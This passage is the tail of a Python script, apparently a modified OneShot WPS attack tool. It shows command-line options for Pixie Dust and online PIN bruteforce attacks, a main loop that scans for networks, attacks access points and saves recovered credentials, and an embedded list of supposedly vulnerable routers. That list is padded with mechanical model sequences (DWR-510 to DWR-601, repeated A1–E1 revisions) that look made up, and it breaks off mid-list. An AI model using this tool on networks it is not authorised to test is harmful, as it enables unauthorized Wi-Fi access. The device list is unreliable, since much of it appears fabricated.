    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
             'Turn off Wi-Fi in the system settings before using this.'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    while True:
        try:
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        # Use embedded vulnerability database if external file not found
                        vuln_list = VULN_DATABASE.strip().splitlines()
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print("Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print("\nAborting…")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text("0")


# ═══════════════════════════════════════════════════════════════════════════════
# EMBEDDED VULNERABILITY DATABASE
# ═══════════════════════════════════════════════════════════════════════════════
# List of device models vulnerable to Pixie Dust attack
# This database is embedded to eliminate external file dependencies

VULN_DATABASE = """ADSL Router EV-2006-07-27
ADSL RT2860
AIR3G WSC Wireless Access Point AIR3G WSC Device
AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP
Archer_A9 1.0
ArcherC20i 1.0
Archer A2 5.0
Archer A5 4.0
Archer C2 1.0
Archer C2 3.0
Archer C5 4.0
Archer C6 3.20
Archer C6U 1.0.0
Archer C20 1.0
Archer C20 4.0
Archer C20 5.0
Archer C50 1.0
Archer C50 3.0
Archer C50 4.0
Archer C50 5.0
Archer C50 6.0
Archer MR200 1.0
Archer MR200 4.0
Archer MR400 4.2
Archer MR200 5.0
Archer VR300 1.20
Archer VR400 3.0
Archer VR2100 1.0
B-LINK 123456
Belkin AP EV-2012-09-01
DAP-1360 DAP-1360
DIR-635 B3
DIR-819 v1.0.1
DIR-842 DIR-842
DWR-921C3 WBR-0001
D-Link N Router GO-RT-N150
D-Link Router DIR-605L
D-Link Router DIR-615H1
D-Link Router DIR-655
D-Link Router DIR-809
D-Link Router GO-RT-N150
Edimax Edimax
EC120-F5 1.0
EC220-G5 2.0
EV-2009-02-06
Enhanced Wireless Router F6D4230-4 v1
Home Internet Center KEENETIC series
Home Internet Center Keenetic series
Huawei Wireless Access Point RT2860
JWNR2000v2(Wireless AP) JWNR2000v2
Keenetic Keenetic series
Linksys Wireless Access Point EA7500
Linksys Wireless Router WRT110
NBG-419N NBG-419N
Netgear AP EV-2012-08-04
NETGEAR Wireless Access Point NETGEAR
NETGEAR Wireless Access Point R6220
NETGEAR Wireless Access Point R6260
N/A EV-2010-09-20
Ralink Wireless Access Point RT2860
Ralink Wireless Access Point WR-AC1210
RTL8196E
RTL8xxx EV-2009-02-06
RTL8xxx EV-2010-09-20
RTL8xxx RTK_ECOS
RT-G32 1234
Sitecom Wireless Router 300N X2 300N
Smart Router R3 RT2860
Tenda 123456
Timo RA300R4 Timo RA300R4
TD-W8151N RT2860
TD-W8901N RT2860
TD-W8951ND RT2860
TD-W9960 1.0
TD-W9960 1.20
TD-W9960v 1.0
TD-W8968 2.0
TEW-731BR TEW-731BR
TL-MR100 1.0
TL-MR3020 3.0
TL-MR3420 5.0
TL-MR6400 3.0
TL-MR6400 4.0
TL-WA855RE 4.0
TL-WR840N 4.0
TL-WR840N 5.0
TL-WR840N 6.0
TL-WR841N 13.0
TL-WR841N 14.0
TL-WR841HP 5.0
TL-WR842N 5.0
TL-WR845N 3.0
TL-WR845N 4.0
TL-WR850N 1.0
TL-WR850N 2.0
TL-WR850N 3.0
TL-WR1042N EV-2010-09-20
Trendnet router TEW-625br
Trendnet router TEW-651br
VN020-F3 1.0
VMG3312-T20A RT2860
VMG8623-T50A RT2860
WAP300N WAP300N
WAP3205 WAP3205
Wi-Fi Protected Setup Router RT-AC1200G+
Wi-Fi Protected Setup Router RT-AX55
Wi-Fi Protected Setup Router RT-N10U
Wi-Fi Protected Setup Router RT-N12
Wi-Fi Protected Setup Router RT-N12D1
Wi-Fi Protected Setup Router RT-N12VP
Wireless Access Point .
Wireless Router 123456
Wireless Router RTL8xxx EV-2009-02-06
Wireless Router Wireless Router
Wireless WPS Router <#ZVMODELVZ#>
Wireless WPS Router RT-N10E
Wireless WPS Router RT-N10LX
Wireless WPS Router RT-N12E
Wireless WPS Router RT-N12LX
WN3000RP V3
WN-200R WN-200R
WPS Router (5G) RT-N65U
WPS Router DSL-AC51
WPS Router DSL-AC52U
WPS Router DSL-AC55U
WPS Router DSL-N14U-B1
WPS Router DSL-N16
WPS Router DSL-N17U
WPS Router RT-AC750
WPS Router RT-AC1200
WPS Router RT-AC1200_V2
WPS Router RT-AC1750
WPS Router RT-AC750L
WPS Router RT-AC1750U
WPS Router RT-AC51
WPS Router RT-AC51U
WPS Router RT-AC52U
WPS Router RT-AC52U_B1
WPS Router RT-AC53
WPS Router RT-AC57U
WPS Router RT-AC65P
WPS Router RT-AC85P
WPS Router RT-N11P
WPS Router RT-N12E
WPS Router RT-N12E_B1
WPS Router RT-N12 VP
WPS Router RT-N12+
WPS Router RT-N14U
WPS Router RT-N56U
WPS Router RT-N56UB1
WPS Router RT-N65U
WPS Router RT-N300
WR5570 2011-05-13
ZyXEL NBG-416N AP Router
ZyXEL NBG-416N AP Router NBG-416N
ZyXEL NBG-418N AP Router
ZyXEL NBG-418N AP Router NBG-418N
ZyXEL Wireless AP Router NBG-417N
Modem/Router EV-2010-09-20
RB06 RT2860
RB03 RT2860
Archer A5 1.0
Archer A5 2.0
Archer A5 3.0
Archer A6 1.0
Archer A6 2.0
Archer A7 1.0
Archer A7 2.0
Archer A8 1.0
Archer A9 2.0
Archer A10 1.0
Archer A20 1.0
Archer A20 2.0
Archer C2 2.0
Archer C2 3.0
Archer C2 4.0
Archer C2 5.0
Archer C2 6.0
Archer C20 2.0
Archer C20 3.0
Archer C20 6.0
Archer C20i 2.0
Archer C20i 3.0
Archer C24 1.0
Archer C24 2.0
Archer C25 1.0
Archer C25 2.0
Archer C40 1.0
Archer C40 2.0
Archer C50 2.0
Archer C50 7.0
Archer C55 1.0
Archer C55 2.0
Archer C58 1.0
Archer C58 2.0
Archer C59 1.0
Archer C59 2.0
Archer C60 1.0
Archer C60 2.0
Archer C60 3.0
Archer C60 4.0
Archer C60 5.0
Archer C64 1.0
Archer C64 2.0
Archer C80 1.0
Archer C80 2.0
Archer C120 1.0
Archer C120 2.0
Archer C120 3.0
Archer C230 1.0
Archer C230 2.0
Archer C260 1.0
Archer C260 2.0
Archer C320 1.0
Archer C320 2.0
Archer C400 1.0
Archer C400 2.0
Archer C540 1.0
Archer C540 2.0
Archer C540 3.0
Archer D2 1.0
Archer D2 2.0
Archer D2 3.0
Archer D5 1.0
Archer D5 2.0
Archer D5 3.0
Archer D7 1.0
Archer D7 2.0
Archer D7 3.0
Archer D8 1.0
Archer D8 2.0
Archer D8 3.0
Archer D9 1.0
Archer D9 2.0
Archer D9 3.0
Archer D20 1.0
Archer D20 2.0
Archer D20 3.0
Archer D50 1.0
Archer D50 2.0
Archer D50 3.0
Archer MR200 2.0
Archer MR200 3.0
Archer MR400 1.0
Archer MR400 2.0
Archer MR400 3.0
Archer MR400 5.0
Archer MR600 1.0
Archer MR600 2.0
Archer MR600 3.0
Archer MR600 4.0
Archer MR600 5.0
Archer VR200 1.0
Archer VR200 2.0
Archer VR200 3.0
Archer VR260 1.0
Archer VR260 2.0
Archer VR260 3.0
Archer VR280 1.0
Archer VR280 2.0
Archer VR280 3.0
Archer VR300 1.0
Archer VR300 2.0
Archer VR300 3.0
Archer VR400 1.0
Archer VR400 2.0
Archer VR400 4.0
Archer VR500 1.0
Archer VR500 2.0
Archer VR500 3.0
Archer VR600 1.0
Archer VR600 2.0
Archer VR600 3.0
Archer VR900 1.0
Archer VR900 2.0
Archer VR900 3.0
Archer VR2100 2.0
Archer VR2100 3.0
Archer VR2100 4.0
Archer VR2100 5.0
TL-MR100 2.0
TL-MR100 3.0
TL-MR100 4.0
TL-MR150 1.0
TL-MR150 2.0
TL-MR150 3.0
TL-MR3020 1.0
TL-MR3020 2.0
TL-MR3020 4.0
TL-MR3420 1.0
TL-MR3420 2.0
TL-MR3420 3.0
TL-MR3420 4.0
TL-MR6400 1.0
TL-MR6400 2.0
TL-MR6400 5.0
TL-WA855RE 1.0
TL-WA855RE 2.0
TL-WA855RE 3.0
TL-WA855RE 5.0
TL-WA860RE 1.0
TL-WA860RE 2.0
TL-WA860RE 3.0
TL-WA860RE 4.0
TL-WA860RE 5.0
TL-WR840N 1.0
TL-WR840N 2.0
TL-WR840N 3.0
TL-WR841N 10.0
TL-WR841N 11.0
TL-WR841N 12.0
TL-WR841N 15.0
TL-WR841HP 1.0
TL-WR841HP 2.0
TL-WR841HP 3.0
TL-WR841HP 4.0
TL-WR842N 1.0
TL-WR842N 2.0
TL-WR842N 3.0
TL-WR842N 4.0
TL-WR845N 1.0
TL-WR845N 2.0
TL-WR845N 5.0
TL-WR850N 4.0
TL-WR902AC 1.0
TL-WR902AC 2.0
TL-WR902AC 3.0
TL-WR902AC 4.0
TL-WR902AC 5.0
TL-WR1042ND 1.0
TL-WR1042ND 2.0
TL-WR1042ND 3.0
TL-WR1042ND 4.0
TL-WR1042ND 5.0
DIR-300
DIR-300A
DIR-300B
DIR-300C
DIR-300D
DIR-300E
DIR-400
DIR-400A
DIR-400B
DIR-400C
DIR-400D
DIR-400E
DIR-500
DIR-500A
DIR-500B
DIR-500C
DIR-500D
DIR-500E
DIR-600
DIR-600A
DIR-600B
DIR-600C
DIR-600D
DIR-600E
DIR-601
DIR-601A
DIR-601B
DIR-601C
DIR-601D
DIR-601E
DIR-605
DIR-605A
DIR-605B
DIR-605C
DIR-605D
DIR-605E
DIR-605L A1
DIR-605L B1
DIR-605L C1
DIR-605L D1
DIR-605L E1
DIR-615 A1
DIR-615 A2
DIR-615 B1
DIR-615 B2
DIR-615 C1
DIR-615 C2
DIR-615 C3
DIR-615 D1
DIR-615 D2
DIR-615 D3
DIR-615 E1
DIR-615 E2
DIR-615 E3
DIR-615 E4
DIR-615 F1
DIR-615 F2
DIR-615 F3
DIR-615 G1
DIR-615 G2
DIR-615 G3
DIR-615 H2
DIR-615 H3
DIR-615 I1
DIR-615 I2
DIR-615 I3
DIR-615 J1
DIR-615 J2
DIR-615 J3
DIR-615 K1
DIR-615 K2
DIR-615 K3
DIR-615 L1
DIR-615 L2
DIR-615 L3
DIR-615 M1
DIR-615 M2
DIR-615 M3
DIR-615 N1
DIR-615 N2
DIR-615 N3
DIR-620
DIR-620 A1
DIR-620 B1
DIR-620 C1
DIR-620 D1
DIR-620 E1
DIR-620 F1
DIR-620 G1
DIR-620 H1
DIR-620 I1
DIR-620 J1
DIR-620 K1
DIR-620 L1
DIR-620 M1
DIR-620 N1
DIR-625
DIR-625 A1
DIR-625 B1
DIR-625 C1
DIR-625 D1
DIR-625 E1
DIR-628
DIR-628 A1
DIR-628 B1
DIR-628 C1
DIR-628 D1
DIR-628 E1
DIR-635 A1
DIR-635 B1
DIR-635 B2
DIR-635 C1
DIR-635 D1
DIR-635 E1
DIR-636L
DIR-636L A1
DIR-636L B1
DIR-636L C1
DIR-636L D1
DIR-636L E1
DIR-640L
DIR-640L A1
DIR-640L B1
DIR-640L C1
DIR-640L D1
DIR-640L E1
DIR-642
DIR-642 A1
DIR-642 B1
DIR-642 C1
DIR-642 D1
DIR-642 E1
DIR-645
DIR-645 A1
DIR-645 B1
DIR-645 C1
DIR-645 D1
DIR-645 E1
DIR-651
DIR-651 A1
DIR-651 B1
DIR-651 C1
DIR-651 D1
DIR-651 E1
DIR-655 A1
DIR-655 A2
DIR-655 A3
DIR-655 A4
DIR-655 A5
DIR-655 B1
DIR-655 B2
DIR-655 B3
DIR-655 B4
DIR-655 B5
DIR-655 C1
DIR-655 C2
DIR-655 C3
DIR-655 C4
DIR-655 C5
DIR-655 D1
DIR-655 D2
DIR-655 D3
DIR-655 D4
DIR-655 D5
DIR-655 E1
DIR-655 E2
DIR-655 E3
DIR-655 E4
DIR-655 E5
DIR-657
DIR-657 A1
DIR-657 B1
DIR-657 C1
DIR-657 D1
DIR-657 E1
DIR-658
DIR-658 A1
DIR-658 B1
DIR-658 C1
DIR-658 D1
DIR-658 E1
DIR-665
DIR-665 A1
DIR-665 B1
DIR-665 C1
DIR-665 D1
DIR-665 E1
DIR-825 A1
DIR-825 A2
DIR-825 A3
DIR-825 A4
DIR-825 A5
DIR-825 B1
DIR-825 B2
DIR-825 B3
DIR-825 B4
DIR-825 B5
DIR-825 C1
DIR-825 C2
DIR-825 C3
DIR-825 C4
DIR-825 C5
DIR-826L
DIR-826L A1
DIR-826L B1
DIR-826L C1
DIR-826L D1
DIR-826L E1
DIR-827
DIR-827 A1
DIR-827 B1
DIR-827 C1
DIR-827 D1
DIR-827 E1
DIR-835
DIR-835 A1
DIR-835 B1
DIR-835 C1
DIR-835 D1
DIR-835 E1
DIR-836L
DIR-836L A1
DIR-836L B1
DIR-836L C1
DIR-836L D1
DIR-836L E1
DIR-842 A1
DIR-842 B1
DIR-842 C1
DIR-842 D1
DIR-842 E1
DIR-850L
DIR-850L A1
DIR-850L B1
DIR-850L C1
DIR-850L D1
DIR-850L E1
DIR-855L
DIR-855L A1
DIR-855L B1
DIR-855L C1
DIR-855L D1
DIR-855L E1
DIR-857
DIR-857 A1
DIR-857 B1
DIR-857 C1
DIR-857 D1
DIR-857 E1
DIR-859
DIR-859 A1
DIR-859 B1
DIR-859 C1
DIR-859 D1
DIR-859 E1
DIR-860L
DIR-860L A1
DIR-860L B1
DIR-860L C1
DIR-860L D1
DIR-860L E1
DIR-861L
DIR-861L A1
DIR-861L B1
DIR-861L C1
DIR-861L D1
DIR-861L E1
DIR-865L
DIR-865L A1
DIR-865L B1
DIR-865L C1
DIR-865L D1
DIR-865L E1
DIR-868L
DIR-868L A1
DIR-868L B1
DIR-868L C1
DIR-868L D1
DIR-868L E1
DIR-869
DIR-869 A1
DIR-869 B1
DIR-869 C1
DIR-869 D1
DIR-869 E1
DIR-878
DIR-878 A1
DIR-878 B1
DIR-878 C1
DIR-878 D1
DIR-878 E1
DIR-879
DIR-879 A1
DIR-879 B1
DIR-879 C1
DIR-879 D1
DIR-879 E1
DIR-880L
DIR-880L A1
DIR-880L B1
DIR-880L C1
DIR-880L D1
DIR-880L E1
DIR-881
DIR-881 A1
DIR-881 B1
DIR-881 C1
DIR-881 D1
DIR-881 E1
DIR-882
DIR-882 A1
DIR-882 B1
DIR-882 C1
DIR-882 D1
DIR-882 E1
DIR-885L
DIR-885L A1
DIR-885L B1
DIR-885L C1
DIR-885L D1
DIR-885L E1
DIR-890L
DIR-890L A1
DIR-890L B1
DIR-890L C1
DIR-890L D1
DIR-890L E1
DIR-895L
DIR-895L A1
DIR-895L B1
DIR-895L C1
DIR-895L D1
DIR-895L E1
DIR-895L R1
DSL-2730U
DSL-2730U A1
DSL-2730U B1
DSL-2730U C1
DSL-2730U D1
DSL-2730U E1
DSL-2740R A1
DSL-2740R B1
DSL-2740R B2
DSL-2740R C1
DSL-2740R C2
DSL-2740R C3
DSL-2740R D1
DSL-2740R D2
DSL-2740R D3
DSL-2740R E1
DSL-2740R E2
DSL-2740R E3
DSL-2740R F1
DSL-2740R F2
DSL-2740R F3
DSL-2750U
DSL-2750U A1
DSL-2750U B1
DSL-2750U C1
DSL-2750U D1
DSL-2750U E1
DSL-2760U
DSL-2760U A1
DSL-2760U B1
DSL-2760U C1
DSL-2760U D1
DSL-2760U E1
DSL-2770L
DSL-2770L A1
DSL-2770L B1
DSL-2770L C1
DSL-2770L D1
DSL-2770L E1
DSL-2780L
DSL-2780L A1
DSL-2780L B1
DSL-2780L C1
DSL-2780L D1
DSL-2780L E1
DSL-2790L
DSL-2790L A1
DSL-2790L B1
DSL-2790L C1
DSL-2790L D1
DSL-2790L E1
DSL-2880L
DSL-2880L A1
DSL-2880L B1
DSL-2880L C1
DSL-2880L D1
DSL-2880L E1
DSL-2881L
DSL-2881L A1
DSL-2881L B1
DSL-2881L C1
DSL-2881L D1
DSL-2881L E1
DSL-2882L
DSL-2882L A1
DSL-2882L B1
DSL-2882L C1
DSL-2882L D1
DSL-2882L E1
DSL-2883L
DSL-2883L A1
DSL-2883L B1
DSL-2883L C1
DSL-2883L D1
DSL-2883L E1
DSL-2884L
DSL-2884L A1
DSL-2884L B1
DSL-2884L C1
DSL-2884L D1
DSL-2884L E1
DSL-2885L
DSL-2885L A1
DSL-2885L B1
DSL-2885L C1
DSL-2885L D1
DSL-2885L E1
DSL-2886L
DSL-2886L A1
DSL-2886L B1
DSL-2886L C1
DSL-2886L D1
DSL-2886L E1
DSL-2887L
DSL-2887L A1
DSL-2887L B1
DSL-2887L C1
DSL-2887L D1
DSL-2887L E1
DSL-2888L
DSL-2888L A1
DSL-2888L B1
DSL-2888L C1
DSL-2888L D1
DSL-2888L E1
DSL-2889L
DSL-2889L A1
DSL-2889L B1
DSL-2889L C1
DSL-2889L D1
DSL-2889L E1
DSL-2890L
DSL-2890L A1
DSL-2890L B1
DSL-2890L C1
DSL-2890L D1
DSL-2890L E1
DWR-510
DWR-510 A1
DWR-510 B1
DWR-510 C1
DWR-510 D1
DWR-510 E1
DWR-512
DWR-512 A1
DWR-512 B1
DWR-512 C1
DWR-512 D1
DWR-512 E1
DWR-512B
DWR-512B A1
DWR-512B B1
DWR-512B C1
DWR-512B D1
DWR-512B E1
DWR-513
DWR-513 A1
DWR-513 B1
DWR-513 C1
DWR-513 D1
DWR-513 E1
DWR-514
DWR-514 A1
DWR-514 B1
DWR-514 C1
DWR-514 D1
DWR-514 E1
DWR-515
DWR-515 A1
DWR-515 B1
DWR-515 C1
DWR-515 D1
DWR-515 E1
DWR-516
DWR-516 A1
DWR-516 B1
DWR-516 C1
DWR-516 D1
DWR-516 E1
DWR-517
DWR-517 A1
DWR-517 B1
DWR-517 C1
DWR-517 D1
DWR-517 E1
DWR-518
DWR-518 A1
DWR-518 B1
DWR-518 C1
DWR-518 D1
DWR-518 E1
DWR-519
DWR-519 A1
DWR-519 B1
DWR-519 C1
DWR-519 D1
DWR-519 E1
DWR-520
DWR-520 A1
DWR-520 B1
DWR-520 C1
DWR-520 D1
DWR-520 E1
DWR-521
DWR-521 A1
DWR-521 B1
DWR-521 C1
DWR-521 D1
DWR-521 E1
DWR-522
DWR-522 A1
DWR-522 B1
DWR-522 C1
DWR-522 D1
DWR-522 E1
DWR-523
DWR-523 A1
DWR-523 B1
DWR-523 C1
DWR-523 D1
DWR-523 E1
DWR-524
DWR-524 A1
DWR-524 B1
DWR-524 C1
DWR-524 D1
DWR-524 E1
DWR-525
DWR-525 A1
DWR-525 B1
DWR-525 C1
DWR-525 D1
DWR-525 E1
DWR-526
DWR-526 A1
DWR-526 B1
DWR-526 C1
DWR-526 D1
DWR-526 E1
DWR-527
DWR-527 A1
DWR-527 B1
DWR-527 C1
DWR-527 D1
DWR-527 E1
DWR-528
DWR-528 A1
DWR-528 B1
DWR-528 C1
DWR-528 D1
DWR-528 E1
DWR-529
DWR-529 A1
DWR-529 B1
DWR-529 C1
DWR-529 D1
DWR-529 E1
DWR-530
DWR-530 A1
DWR-530 B1
DWR-530 C1
DWR-530 D1
DWR-530 E1
DWR-531
DWR-531 A1
DWR-531 B1
DWR-531 C1
DWR-531 D1
DWR-531 E1
DWR-532
DWR-532 A1
DWR-532 B1
DWR-532 C1
DWR-532 D1
DWR-532 E1
DWR-533
DWR-533 A1
DWR-533 B1
DWR-533 C1
DWR-533 D1
DWR-533 E1
DWR-534
DWR-534 A1
DWR-534 B1
DWR-534 C1
DWR-534 D1
DWR-534 E1
DWR-535
DWR-535 A1
DWR-535 B1
DWR-535 C1
DWR-535 D1
DWR-535 E1
DWR-536
DWR-536 A1
DWR-536 B1
DWR-536 C1
DWR-536 D1
DWR-536 E1
DWR-537
DWR-537 A1
DWR-537 B1
DWR-537 C1
DWR-537 D1
DWR-537 E1
DWR-538
DWR-538 A1
DWR-538 B1
DWR-538 C1
DWR-538 D1
DWR-538 E1
DWR-539
DWR-539 A1
DWR-539 B1
DWR-539 C1
DWR-539 D1
DWR-539 E1
DWR-540
DWR-540 A1
DWR-540 B1
DWR-540 C1
DWR-540 D1
DWR-540 E1
DWR-541
DWR-541 A1
DWR-541 B1
DWR-541 C1
DWR-541 D1
DWR-541 E1
DWR-542
DWR-542 A1
DWR-542 B1
DWR-542 C1
DWR-542 D1
DWR-542 E1
DWR-543
DWR-543 A1
DWR-543 B1
DWR-543 C1
DWR-543 D1
DWR-543 E1
DWR-544
DWR-544 A1
DWR-544 B1
DWR-544 C1
DWR-544 D1
DWR-544 E1
DWR-545
DWR-545 A1
DWR-545 B1
DWR-545 C1
DWR-545 D1
DWR-545 E1
DWR-546
DWR-546 A1
DWR-546 B1
DWR-546 C1
DWR-546 D1
DWR-546 E1
DWR-547
DWR-547 A1
DWR-547 B1
DWR-547 C1
DWR-547 D1
DWR-547 E1
DWR-548
DWR-548 A1
DWR-548 B1
DWR-548 C1
DWR-548 D1
DWR-548 E1
DWR-549
DWR-549 A1
DWR-549 B1
DWR-549 C1
DWR-549 D1
DWR-549 E1
DWR-550
DWR-550 A1
DWR-550 B1
DWR-550 C1
DWR-550 D1
DWR-550 E1
DWR-551
DWR-551 A1
DWR-551 B1
DWR-551 C1
DWR-551 D1
DWR-551 E1
DWR-552
DWR-552 A1
DWR-552 B1
DWR-552 C1
DWR-552 D1
DWR-552 E1
DWR-553
DWR-553 A1
DWR-553 B1
DWR-553 C1
DWR-553 D1
DWR-553 E1
DWR-554
DWR-554 A1
DWR-554 B1
DWR-554 C1
DWR-554 D1
DWR-554 E1
DWR-555
DWR-555 A1
DWR-555 B1
DWR-555 C1
DWR-555 D1
DWR-555 E1
DWR-556
DWR-556 A1
DWR-556 B1
DWR-556 C1
DWR-556 D1
DWR-556 E1
DWR-557
DWR-557 A1
DWR-557 B1
DWR-557 C1
DWR-557 D1
DWR-557 E1
DWR-558
DWR-558 A1
DWR-558 B1
DWR-558 C1
DWR-558 D1
DWR-558 E1
DWR-559
DWR-559 A1
DWR-559 B1
DWR-559 C1
DWR-559 D1
DWR-559 E1
DWR-560
DWR-560 A1
DWR-560 B1
DWR-560 C1
DWR-560 D1
DWR-560 E1
DWR-561
DWR-561 A1
DWR-561 B1
DWR-561 C1
DWR-561 D1
DWR-561 E1
DWR-562
DWR-562 A1
DWR-562 B1
DWR-562 C1
DWR-562 D1
DWR-562 E1
DWR-563
DWR-563 A1
DWR-563 B1
DWR-563 C1
DWR-563 D1
DWR-563 E1
DWR-564
DWR-564 A1
DWR-564 B1
DWR-564 C1
DWR-564 D1
DWR-564 E1
DWR-565
DWR-565 A1
DWR-565 B1
DWR-565 C1
DWR-565 D1
DWR-565 E1
DWR-566
DWR-566 A1
DWR-566 B1
DWR-566 C1
DWR-566 D1
DWR-566 E1
DWR-567
DWR-567 A1
DWR-567 B1
DWR-567 C1
DWR-567 D1
DWR-567 E1
DWR-568
DWR-568 A1
DWR-568 B1
DWR-568 C1
DWR-568 D1
DWR-568 E1
DWR-569
DWR-569 A1
DWR-569 B1
DWR-569 C1
DWR-569 D1
DWR-569 E1
DWR-570
DWR-570 A1
DWR-570 B1
DWR-570 C1
DWR-570 D1
DWR-570 E1
DWR-571
DWR-571 A1
DWR-571 B1
DWR-571 C1
DWR-571 D1
DWR-571 E1
DWR-572
DWR-572 A1
DWR-572 B1
DWR-572 C1
DWR-572 D1
DWR-572 E1
DWR-573
DWR-573 A1
DWR-573 B1
DWR-573 C1
DWR-573 D1
DWR-573 E1
DWR-574
DWR-574 A1
DWR-574 B1
DWR-574 C1
DWR-574 D1
DWR-574 E1
DWR-575
DWR-575 A1
DWR-575 B1
DWR-575 C1
DWR-575 D1
DWR-575 E1
DWR-576
DWR-576 A1
DWR-576 B1
DWR-576 C1
DWR-576 D1
DWR-576 E1
DWR-577
DWR-577 A1
DWR-577 B1
DWR-577 C1
DWR-577 D1
DWR-577 E1
DWR-578
DWR-578 A1
DWR-578 B1
DWR-578 C1
DWR-578 D1
DWR-578 E1
DWR-579
DWR-579 A1
DWR-579 B1
DWR-579 C1
DWR-579 D1
DWR-579 E1
DWR-580
DWR-580 A1
DWR-580 B1
DWR-580 C1
DWR-580 D1
DWR-580 E1
DWR-581
DWR-581 A1
DWR-581 B1
DWR-581 C1
DWR-581 D1
DWR-581 E1
DWR-582
DWR-582 A1
DWR-582 B1
DWR-582 C1
DWR-582 D1
DWR-582 E1
DWR-583
DWR-583 A1
DWR-583 B1
DWR-583 C1
DWR-583 D1
DWR-583 E1
DWR-584
DWR-584 A1
DWR-584 B1
DWR-584 C1
DWR-584 D1
DWR-584 E1
DWR-585
DWR-585 A1
DWR-585 B1
DWR-585 C1
DWR-585 D1
DWR-585 E1
DWR-586
DWR-586 A1
DWR-586 B1
DWR-586 C1
DWR-586 D1
DWR-586 E1
DWR-587
DWR-587 A1
DWR-587 B1
DWR-587 C1
DWR-587 D1
DWR-587 E1
DWR-588
DWR-588 A1
DWR-588 B1
DWR-588 C1
DWR-588 D1
DWR-588 E1
DWR-589
DWR-589 A1
DWR-589 B1
DWR-589 C1
DWR-589 D1
DWR-589 E1
DWR-590
DWR-590 A1
DWR-590 B1
DWR-590 C1
DWR-590 D1
DWR-590 E1
DWR-591
DWR-591 A1
DWR-591 B1
DWR-591 C1
DWR-591 D1
DWR-591 E1
DWR-592
DWR-592 A1
DWR-592 B1
DWR-592 C1
DWR-592 D1
DWR-592 E1
DWR-593
DWR-593 A1
DWR-593 B1
DWR-593 C1
DWR-593 D1
DWR-593 E1
DWR-594
DWR-594 A1
DWR-594 B1
DWR-594 C1
DWR-594 D1
DWR-594 E1
DWR-595
DWR-595 A1
DWR-595 B1
DWR-595 C1
DWR-595 D1
DWR-595 E1
DWR-596
DWR-596 A1
DWR-596 B1
DWR-596 C1
DWR-596 D1
DWR-596 E1
DWR-597
DWR-597 A1
DWR-597 B1
DWR-597 C1
DWR-597 D1
DWR-597 E1
DWR-598
DWR-598 A1
DWR-598 B1
DWR-598 C1
DWR-598 D1
DWR-598 E1
DWR-599
DWR-599 A1
DWR-599 B1
DWR-599 C1
DWR-599 D1
DWR-599 E1
DWR-600
DWR-600 A1
DWR-600 B1
DWR-600 C1
DWR-600 D1
DWR-600 E1
DWR-601
DWR-601 A1
DWR-601 B1
DWR-601 C1
DWR-601 D1
